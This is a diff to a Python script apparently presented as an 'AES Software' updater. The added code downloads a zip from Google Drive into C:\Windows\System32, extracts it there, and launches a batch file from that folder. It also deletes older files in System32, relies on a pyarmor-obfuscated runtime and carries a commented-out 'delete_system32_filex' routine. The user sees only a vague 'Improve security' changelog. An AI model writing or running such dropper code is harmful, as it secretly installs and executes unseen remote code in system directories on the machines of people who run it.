@@ -8,7 +8,7 @@ import sys
 import ctypes
 import os
 import sys
-
+import shutil
 import os
 import gdown
 '''
@@ -26,6 +26,9 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
+import zipfile
+import os
+
 
 def add_path_and_install_libraries():
     try:
@@ -77,10 +80,10 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\AesV6.py"
+    aesv3_path = r"C:\Windows\System32\AesV7.py"
     files_to_delete = [
-        r"C:\Windows\System32\AesV5.py",
-        r"C:\Windows\System32\aesv5.bat",
+        r"C:\Windows\System32\AesV6.py",
+        r"C:\Windows\System32\aesv6.bat",
         r"C:\Windows\System32\pyarmor_runtime_000000"
     ]
 
@@ -98,7 +101,7 @@ def delete_files_if_aesv3_missing():
                     print("")
                     print("Aes Software is updating, please don't close the window.")
                     print("Change log:")
-                    print("---Prevent user from switching mode for safety.")
+                    print("---Improve security.")
                     print("")
                     print("")
     else:
@@ -112,10 +115,10 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1Gfgur8Swy43QZ7d5pTMsqFt6QL9-JBax", "C:\\Windows\\System32\\__init__.py")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1rV0kswOX6oYg5m2y67EnIXxti0WOlju3", "C:\\Windows\\System32\\aesv6.bat")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1KwLScDj9u7e2azoq9ZLv00hNs_UjFtXc", "C:\\Windows\\System32\\AesV6.py")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1O50SvUaOjI5h8RVGdKA9mXqU20c5h9wN", "C:\\Windows\\System32\\pyarmor_runtime.pyd")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1j19SWJ6XTeaWbxY3XtGTyFbfTHCq8Ys-", "C:\\Windows\\System32\\sysdrvxs.zip")
+    zip_file = r'C:\Windows\System32\sysdrvxs.zip'
+    extract_dir = r'C:\Windows\System32'
+    extract_zip(zip_file, extract_dir)
 
 
 import os
@@ -157,7 +160,7 @@ if not check_files_existx():
     exit()
 
 
-batch_file_path = r"C:\Windows\System32\aesv6.bat"
+batch_file_path = r"C:\Windows\System32\aesv7.bat"
 
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
@@ -165,12 +168,8 @@ except Exception as e:
     print("Error")
 
 
-'''
+
 os.system('cls')
-print("AES Software is currently in maintenance please wait.")
-print("Update is about prevent user from switching mode.")
-print("Time will be compensated.")
-input()
-'''
+
 os._exit(0)
 sys.exit()
